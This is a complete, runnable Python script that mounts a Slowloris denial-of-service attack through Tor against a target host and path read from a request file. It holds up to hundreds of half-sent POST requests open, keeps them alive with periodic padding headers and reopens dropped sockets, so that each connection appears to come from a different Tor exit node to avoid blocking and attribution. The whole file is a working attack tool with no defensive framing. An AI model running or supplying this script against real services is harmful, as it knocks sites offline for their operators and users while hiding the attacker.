#!/usr/bin/env python3
"""Slowloris via Tor — each connection uses a different Tor exit node."""
import socket
import time
import sys
import os

try:
    import socks
except ImportError:
    print("[!] PySocks not installed. Run: pip3 install PySocks", flush=True)
    sys.exit(1)

from request_loader import load_request_data, build_cookie_header

REQ = load_request_data()
TARGET_HOST = REQ["host"]
TARGET_PORT = REQ["port"]
TOR_PROXY = ("127.0.0.1", 9050)
NUM_CONNECTIONS = int(sys.argv[1]) if len(sys.argv) > 1 else 200


def create_tor_socket():
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, TOR_PROXY[0], TOR_PROXY[1])
        s.settimeout(30)
        s.connect((TARGET_HOST, TARGET_PORT))

        headers = f"POST {REQ['path']} HTTP/1.1\r\n"
        for k, v in REQ["headers"].items():
            headers += f"{k}: {v}\r\n"
        cookie_str = build_cookie_header(REQ["cookies"])
        if cookie_str and "Cookie" not in REQ["headers"]:
            headers += f"Cookie: {cookie_str}\r\n"
        headers += "Content-Length: 1000000\r\n"
        headers += "Content-Type: application/x-www-form-urlencoded\r\n"

        s.send(headers.encode())
        return s
    except Exception:
        return None


def main():
    print(f"[slowloris-tor] Opening {NUM_CONNECTIONS} sockets via Tor to {TARGET_HOST}:{TARGET_PORT}", flush=True)
    print(f"[slowloris-tor] Path: {REQ['path']} | Headers: {len(REQ['headers'])} | Cookies: {len(REQ['cookies'])}", flush=True)

    sockets_list = []
    for i in range(NUM_CONNECTIONS):
        s = create_tor_socket()
        if s:
            sockets_list.append(s)
        if i % 10 == 0:
            print(f"[slowloris-tor] Opened {len(sockets_list)} sockets so far...", flush=True)

    print(f"[slowloris-tor] Holding {len(sockets_list)} connections open", flush=True)

    while True:
        dead = []
        for s in sockets_list:
            try:
                s.send(b"X-Pad: keep-alive\r\n")
            except Exception:
                dead.append(s)

        for s in dead:
            try:
                s.close()
            except Exception:
                pass
            sockets_list.remove(s)
            new_s = create_tor_socket()
            if new_s:
                sockets_list.append(new_s)

        if dead:
            print(f"[slowloris-tor] Replaced {len(dead)}, holding {len(sockets_list)}", flush=True)

        time.sleep(10)


if __name__ == "__main__":
    main()
